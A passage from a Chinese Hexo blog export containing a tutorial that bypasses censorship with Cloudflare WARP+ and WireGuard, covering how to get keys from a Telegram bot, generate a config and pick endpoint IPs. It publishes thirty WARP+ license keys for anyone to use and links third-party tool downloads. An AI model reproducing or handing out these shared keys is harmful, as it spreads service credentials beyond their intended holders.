优选IP**。\n\nCloudFlare拥有极高的业界权威，拥有顶尖的技术团队，拥有最安全的网络方案，他们公司的推出的science online技术那是无形中代表了一个技术标准的。在我实际体验下来，效果确实非常好，很舒服。\n\n<!-- more -->\n\n### 环境准备\n\n虽说是教程，但可不是从0开始的教程。\n\n* 需要拥有telegram账号和客户端，客户端可以是安卓、windows、Mac、iOS、Linux。\n\n* [telegram官网](https://telegram.org/)\n\n### 获取Warp+的永久免费流量\n\n需要在telegram里搜索一个机器人，机器人叫“warp+ bot”，但是我试了一下，直接搜是搜不出来的，后来发现可以通过链接直接找到他，[链接地址](https://t.me/generatewarpplusbot)\n\n![telegram](./science-network/1.jpg)\n\n* 找到这个机器人之后，发送指令`/generate`\n\n* 然后他会让你关注两个类似公众号的东西，就是图中的`Warp Plus`和`akame.moe enjoyers`直接按他的意思进行关注\n\n* 再次发送`/generate` 然后他会进行真人验证，给你出一道一位数相加的数学题\n\n* 按照他的题，把答案写在命令之后，比如图中的`/generate 8`，然后就可以拿到一个秘钥，把这个秘钥留好，待会要用到。（其实不留好也没关系，丢了可以再申领一个，而且每个秘钥含的流量已经超过2EB了，所以说根本用不完，就差把永久免费写在脑门上了）\n\n我也向大家提供几个可以直接使用的秘钥：\n\n```bash 折叠代码\n🔐 Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)\n🔐 Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)\n🔐 Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)\n🔐 Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)\n🔐 Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)\n🔐 Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)\n🔐 Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)\n🔐 Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)\n🔐 Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)\n🔐 Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 GB)\n🔐 Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)\n🔐 Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)\n🔐 Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)\n🔐 Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)\n🔐 Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)\n🔐 Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)\n🔐 Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)\n🔐 Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)\n🔐 Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)\n🔐 Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)\n🔐 Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)\n🔐 Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)\n🔐 Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)\n🔐 Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)\n🔐 Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)\n🔐 Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)\n🔐 Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)\n🔐 Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)\n🔐 Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)\n🔐 Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)\n```\n\n### 下载代理工具\n\n这次需要的代理工具是wireguard，[官方下载链接](https://www.wireguard.com/install/)\n\n[备用下载地址](https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha)\n提取码：trha\n\n下载完直接安装就OK。\n\n这是软件的截图。\n\n![wireguard软件截图](./science-network/2.png)\n\n新用户没有配置是不会有配置信息的\n\n* 首先左下角找到这个下拉框，点击新建空隧道\n\n* 会让你起一个名字，随便起一个名字就好\n\n* 公钥的部分不要动\n\n* 再往下的文本块是配置信息，然后把画面停在这里，最小化，我们去生成配置信息\n\n### 生成配置信息\n\n利用一个在线的工具生成配置信息，[工具链接地址](https://replit.com/@misaka-blog/wgcf-profile-generator?v=1)\n\n![网站截图](./science-network/3.png)\n\n进入网站后，点击右上角的Run，稍等片刻\n\n![开始配置](./science-network/4.png)\n\n出现这个画面后，因为我们使用的是秘钥，对应的选项是2，输入2后回车。\n\n![开始配置](./science-network/5.png)\n\n这里让输入秘钥，就是之前在telegram获取的秘钥，粘贴在这里后回车。\n\n之后会要求输入一个随机设备名，随便输入一个字符串回车就好。\n\n![开始配置](./science-network/6.png)\n\n生成的红色部分就是配置信息，把配置信息复制下来，然后粘贴在wireguard的文本块里，就像这样。\n\n![开始配置](./science-network/7.png)\n\n最后保存配置信息。\n\n大多数情况下是没有办法直接使用的，因为现在拿到的IP并不是最优IP，所以需要另一个工具来帮助筛选最优的IP，需要注意的是，如果目前有在使用任何的代理或者science online工具必须要停下来，不然会极度影响最优IP的筛选。\n\n### 筛选最优IP\n\n[工具下载链接](https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z)\n\n[备用下载链接](https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f)\n提取码：je5f\n\n这个工具是完全免费开源的，可以放心使用。\n\n下载完解压，有一个`warp-yxip.bat`的文件，双击运行\n\n![运行效果](./science-network/8.png)\n\n选择IPV4的筛选，输入1，回车，等待片刻，进程运行完毕后，会在工具的目录下生成一个result的文件使用Excel打开。\n\n![效果如图](./science-network/9.png)\n\n* LOSS 是丢包率\n\n* DELAY 是延迟\n\n默认会把结果按从优到差进行排序，只需要从前面几个抽一个，复制好IP和端口号然后替换掉wireguard配置文件里的最后一项，比如`Endpoint = 162.159.192.160:894`。\n\n补充一点，在wireguard里，如果需要再对配置文件进行更改，可以直接右击配置名称，选择“编辑所选隧道”。\n\n配置到这里，就完成了，可以进行连接，开始science online旅程了。","slug":"science-network","published":1,"updated":"2024-05-03T03:55:54.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gg00827zj3hjy2f2q8","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>从我有了第一台电脑后，science online的手段也逐渐见证着我的成长，从最初的浏览器插件上网，到SSR的小飞机，再到V2ray，以及后面陪伴我最久的clash。可以说已经是身经百战的老油条了。到今天我又遇到了一个具有里程碑式的science online手段<strong>CloudFlare+Warp+ 优选IP</strong>。</p>\n<p>CloudFlare拥有极高的业界权威，拥有顶尖的技术团队，拥有最安全的网络方案，他们公司的推出的science online技术那是无形中代表了一个技术标准的。在我实际体验下来，效果确实非常好，很舒服。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>虽说是教程，但可不是从0开始的教程。</p>\n<ul>\n<li><p>需要拥有telegram账号和客户端，客户端可以是安卓、windows、Mac、iOS、Linux。</p>\n</li>\n<li><p><a href=\"https://telegram.org/\">telegram官网</a></p>\n</li>\n</ul>\n<h3 id=\"获取Warp-的永久免费流量\"><a href=\"#获取Warp-的永久免费流量\" class=\"headerlink\" title=\"获取Warp+的永久免费流量\"></a>获取Warp+的永久免费流量</h3><p>需要在telegram里搜索一个机器人，机器人叫“warp+ bot”，但是我试了一下，直接搜是搜不出来的，后来发现可以通过链接直接找到他，<a href=\"https://t.me/generatewarpplusbot\">链接地址</a></p>\n<p><img src=\"/2023/07/25/science-network/1.jpg\" alt=\"telegram\"></p>\n<ul>\n<li><p>找到这个机器人之后，发送指令<code>/generate</code></p>\n</li>\n<li><p>然后他会让你关注两个类似公众号的东西，就是图中的<code>Warp Plus</code>和<code>akame.moe enjoyers</code>直接按他的意思进行关注</p>\n</li>\n<li><p>再次发送<code>/generate</code> 然后他会进行真人验证，给你出一道一位数相加的数学题</p>\n</li>\n<li><p>按照他的题，把答案写在命令之后，比如图中的<code>/generate 8</code>，然后就可以拿到一个秘钥，把这个秘钥留好，待会要用到。（其实不留好也没关系，丢了可以再申领一个，而且每个秘钥含的流量已经超过2EB了，所以说根本用不完，就差把永久免费写在脑门上了）</p>\n</li>\n</ul>\n<p>我也向大家提供几个可以直接使用的秘钥：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">🔐 Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)</span><br><span class=\"line\">🔐 Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)</span><br><span class=\"line\">🔐 Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)</span><br><span class=\"line\">🔐 Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)</span><br><span class=\"line\">🔐 Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)</span><br><span class=\"line\">🔐 Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)</span><br><span class=\"line\">🔐 Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)</span><br><span class=\"line\">🔐 Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)</span><br><span class=\"line\">🔐 Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 GB)</span><br><span class=\"line\">🔐 Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)</span><br><span class=\"line\">🔐 Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)</span><br><span class=\"line\">🔐 Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)</span><br><span class=\"line\">🔐 Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)</span><br><span class=\"line\">🔐 Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)</span><br><span class=\"line\">🔐 Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)</span><br><span class=\"line\">🔐 Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)</span><br><span class=\"line\">🔐 Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)</span><br><span class=\"line\">🔐 Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)</span><br><span class=\"line\">🔐 Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)</span><br><span class=\"line\">🔐 Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)</span><br><span class=\"line\">🔐 Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)</span><br><span class=\"line\">🔐 Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)</span><br><span class=\"line\">🔐 Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)</span><br><span class=\"line\">🔐 Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"下载代理工具\"><a href=\"#下载代理工具\" class=\"headerlink\" title=\"下载代理工具\"></a>下载代理工具</h3><p>这次需要的代理工具是wireguard，<a href=\"https://www.wireguard.com/install/\">官方下载链接</a></p>\n<p><a href=\"https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha\">备用下载地址</a><br>提取码：trha</p>\n<p>下载完直接安装就OK。</p>\n<p>这是软件的截图。</p>\n<p><img src=\"/2023/07/25/science-network/2.png\" alt=\"wireguard软件截图\"></p>\n<p>新用户没有配置是不会有配置信息的</p>\n<ul>\n<li><p>首先左下角找到这个下拉框，点击新建空隧道</p>\n</li>\n<li><p>会让你起一个名字，随便起一个名字就好</p>\n</li>\n<li><p>公钥的部分不要动</p>\n</li>\n<li><p>再往下的文本块是配置信息，然后把画面停在这里，最小化，我们去生成配置信息</p>\n</li>\n</ul>\n<h3 id=\"生成配置信息\"><a href=\"#生成配置信息\" class=\"headerlink\" title=\"生成配置信息\"></a>生成配置信息</h3><p>利用一个在线的工具生成配置信息，<a href=\"https://replit.com/@misaka-blog/wgcf-profile-generator?v=1\">工具链接地址</a></p>\n<p><img src=\"/2023/07/25/science-network/3.png\" alt=\"网站截图\"></p>\n<p>进入网站后，点击右上角的Run，稍等片刻</p>\n<p><img src=\"/2023/07/25/science-network/4.png\" alt=\"开始配置\"></p>\n<p>出现这个画面后，因为我们使用的是秘钥，对应的选项是2，输入2后回车。</p>\n<p><img src=\"/2023/07/25/science-network/5.png\" alt=\"开始配置\"></p>\n<p>这里让输入秘钥，就是之前在telegram获取的秘钥，粘贴在这里后回车。</p>\n<p>之后会要求输入一个随机设备名，随便输入一个字符串回车就好。</p>\n<p><img src=\"/2023/07/25/science-network/6.png\" alt=\"开始配置\"></p>\n<p>生成的红色部分就是配置信息，把配置信息复制下来，然后粘贴在wireguard的文本块里，就像这样。</p>\n<p><img src=\"/2023/07/25/science-network/7.png\" alt=\"开始配置\"></p>\n<p>最后保存配置信息。</p>\n<p>大多数情况下是没有办法直接使用的，因为现在拿到的IP并不是最优IP，所以需要另一个工具来帮助筛选最优的IP，需要注意的是，如果目前有在使用任何的代理或者science online工具必须要停下来，不然会极度影响最优IP的筛选。</p>\n<h3 id=\"筛选最优IP\"><a href=\"#筛选最优IP\" class=\"headerlink\" title=\"筛选最优IP\"></a>筛选最优IP</h3><p><a href=\"https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z\">工具下载链接</a></p>\n<p><a href=\"https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f\">备用下载链接</a><br>提取码：je5f</p>\n<p>这个工具是完全免费开源的，可以放心使用。</p>\n<p>下载完解压，有一个<code>warp-yxip.bat</code>的文件，双击运行</p>\n<p><img src=\"/2023/07/25/science-network/8.png\" alt=\"运行效果\"></p>\n<p>选择IPV4的筛选，输入1，回车，等待片刻，进程运行完毕后，会在工具的目录下生成一个result的文件使用Excel打开。</p>\n<p><img src=\"/2023/07/25/science-network/9.png\" alt=\"效果如图\"></p>\n<ul>\n<li><p>LOSS 是丢包率</p>\n</li>\n<li><p>DELAY 是延迟</p>\n</li>\n</ul>\n<p>默认会把结果按从优到差进行排序，只需要从前面几个抽一个，复制好IP和端口号然后替换掉wireguard配置文件里的最后一项，比如<code>Endpoint = 162.159.192.160:894</code>。</p>\n<p>补充一点，在wireguard里，如果需要再对配置文件进行更改，可以直接右击配置名称，选择“编辑所选隧道”。</p>\n<p>配置到这里，就完成了，可以进行连接，开始science online旅程了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>从我有了第一台电脑后，science online的手段也逐渐见证着我的成长，从最初的浏览器插件上网，到SSR的小飞机，再到V2ray，以及后面陪伴我最久的clash。可以说已经是身经百战的老油条了。到今天我又遇到了一个具有里程碑式的science online手段<strong>CloudFlare+Warp+ 优选IP</strong>。</p>\n<p>CloudFlare拥有极高的业界权威，拥有顶尖的技术团队，拥有最安全的网络方案，他们公司的推出的science online技术那是无形中代表了一个技术标准的。在我实际体验下来，效果确实非常好，很舒服。</p>","more":"<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p>虽说是教程，但可不是从0开始的教程。</p>\n<ul>\n<li><p>需要拥有telegram账号和客户端，客户端可以是安卓、windows、Mac、iOS、Linux。</p>\n</li>\n<li><p><a href=\"https://telegram.org/\">telegram官网</a></p>\n</li>\n</ul>\n<h3 id=\"获取Warp-的永久免费流量\"><a href=\"#获取Warp-的永久免费流量\" class=\"headerlink\" title=\"获取Warp+的永久免费流量\"></a>获取Warp+的永久免费流量</h3><p>需要在telegram里搜索一个机器人，机器人叫“warp+ bot”，但是我试了一下，直接搜是搜不出来的，后来发现可以通过链接直接找到他，<a href=\"https://t.me/generatewarpplusbot\">链接地址</a></p>\n<p><img src=\"/2023/07/25/science-network/1.jpg\" alt=\"telegram\"></p>\n<ul>\n<li><p>找到这个机器人之后，发送指令<code>/generate</code></p>\n</li>\n<li><p>然后他会让你关注两个类似公众号的东西，就是图中的<code>Warp Plus</code>和<code>akame.moe enjoyers</code>直接按他的意思进行关注</p>\n</li>\n<li><p>再次发送<code>/generate</code> 然后他会进行真人验证，给你出一道一位数相加的数学题</p>\n</li>\n<li><p>按照他的题，把答案写在命令之后，比如图中的<code>/generate 8</code>，然后就可以拿到一个秘钥，把这个秘钥留好，待会要用到。（其实不留好也没关系，丢了可以再申领一个，而且每个秘钥含的流量已经超过2EB了，所以说根本用不完，就差把永久免费写在脑门上了）</p>\n</li>\n</ul>\n<p>我也向大家提供几个可以直接使用的秘钥：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">🔐 Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)</span><br><span class=\"line\">🔐 Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)</span><br><span class=\"line\">🔐 Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)</span><br><span class=\"line\">🔐 Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)</span><br><span class=\"line\">🔐 Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)</span><br><span class=\"line\">🔐 Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)</span><br><span class=\"line\">🔐 Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)</span><br><span class=\"line\">🔐 Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)</span><br><span class=\"line\">🔐 Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 GB)</span><br><span class=\"line\">🔐 Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)</span><br><span class=\"line\">🔐 Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)</span><br><span class=\"line\">🔐 Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)</span><br><span class=\"line\">🔐 Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)</span><br><span class=\"line\">🔐 Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)</span><br><span class=\"line\">🔐 Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)</span><br><span class=\"line\">🔐 Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)</span><br><span class=\"line\">🔐 Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)</span><br><span class=\"line\">🔐 Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)</span><br><span class=\"line\">🔐 Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)</span><br><span class=\"line\">🔐 Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)</span><br><span class=\"line\">🔐 Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)</span><br><span class=\"line\">🔐 Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)</span><br><span class=\"line\">🔐 Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)</span><br><span class=\"line\">🔐 Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)</span><br><span class=\"line\">🔐 Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"下载代理工具\"><a href=\"#下载代理工具\" class=\"headerlink\" title=\"下载代理工具\"></a>下载代理工具</h3><p>这次需要的代理工具是wireguard，<a href=\"https://www.wireguard.com/install/\">官方下载链接</a></p>\n<p><a href=\"https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha\">备用下载地址</a><br>提取码：trha</p>\n<p>下载完直接安装就OK。</p>\n<p>这是软件的截图。</p>\n<p><img src=\"/2023/07/25/science-network/2.png\" alt=\"wireguard软件截图\"></p>\n<p>新用户没有配置是不会有配置信息的</p>\n<ul>\n<li><p>首先左下角找到这个下拉框，点击新建空隧道</p>\n</li>\n<li><p>会让你起一个名字，随便起一个名字就好</p>\n</li>\n<li><p>公钥的部分不要动</p>\n</li>\n<li><p>再往下的文本块是配置信息，然后把画面停在这里，最小化，我们去生成配置信息</p>\n</li>\n</ul>\n<h3 id=\"生成配置信息\"><a href=\"#生成配置信息\" class=\"headerlink\" title=\"生成配置信息\"></a>生成配置信息</h3><p>利用一个在线的工具生成配置信息，<a href=\"https://replit.com/@misaka-blog/wgcf-profile-generator?v=1\">工具链接地址</a></p>\n<p><img src=\"/2023/07/25/science-network/3.png\" alt=\"网站截图\"></p>\n<p>进入网站后，点击右上角的Run，稍等片刻</p>\n<p><img src=\"/2023/07/25/science-network/4.png\" alt=\"开始配置\"></p>\n<p>出现这个画面后，因为我们使用的是秘钥，对应的选项是2，输入2后回车。</p>\n<p><img src=\"/2023/07/25/science-network/5.png\" alt=\"开始配置\"></p>\n<p>这里让输入秘钥，就是之前在telegram获取的秘钥，粘贴在这里后回车。</p>\n<p>之后会要求输入一个随机设备名，随便输入一个字符串回车就好。</p>\n<p><img src=\"/2023/07/25/science-network/6.png\" alt=\"开始配置\"></p>\n<p>生成的红色部分就是配置信息，把配置信息复制下来，然后粘贴在wireguard的文本块里，就像这样。</p>\n<p><img src=\"/2023/07/25/science-network/7.png\" alt=\"开始配置\"></p>\n<p>最后保存配置信息。</p>\n<p>大多数情况下是没有办法直接使用的，因为现在拿到的IP并不是最优IP，所以需要另一个工具来帮助筛选最优的IP，需要注意的是，如果目前有在使用任何的代理或者science online工具必须要停下来，不然会极度影响最优IP的筛选。</p>\n<h3 id=\"筛选最优IP\"><a href=\"#筛选最优IP\" class=\"headerlink\" title=\"筛选最优IP\"></a>筛选最优IP</h3><p><a href=\"https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z\">工具下载链接</a></p>\n<p><a href=\"https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f\">备用下载链接</a><br>提取码：je5f</p>\n<p>这个工具是完全免费开源的，可以放心使用。</p>\n<p>下载完解压，有一个<code>warp-yxip.bat</code>的文件，双击运行</p>\n<p><img src=\"/2023/07/25/science-network/8.png\" alt=\"运行效果\"></p>\n<p>选择IPV4的筛选，输入1，回车，等待片刻，进程运行完毕后，会在工具的目录下生成一个result的文件使用Excel打开。</p>\n<p><img src=\"/2023/07/25/science-network/9.png\" alt=\"效果如图\"></p>\n<ul>\n<li><p>LOSS 是丢包率</p>\n</li>\n<li><p>DELAY 是延迟</p>\n</li>\n</ul>\n<p>默认会把结果按从优到差进行排序，只需要从前面几个抽一个，复制好IP和端口号然后替换掉wireguard配置文件里的最后一项，比如<code>Endpoint = 162.159.192.160:894</code>。</p>\n<p>补充一点，在wireguard里，如果需要再对配置文件进行更改，可以直接右击配置名称，选择“编辑所选隧道”。</p>\n<p>配置到这里，就完成了，可以进行连接，开始science online旅程了。</p>"},{"title":"关于seliunx的学习过程","date":"2023-05-24T14:02:47.000Z","_content":"\n### 修改文件SELinux的上下文\n\n#### 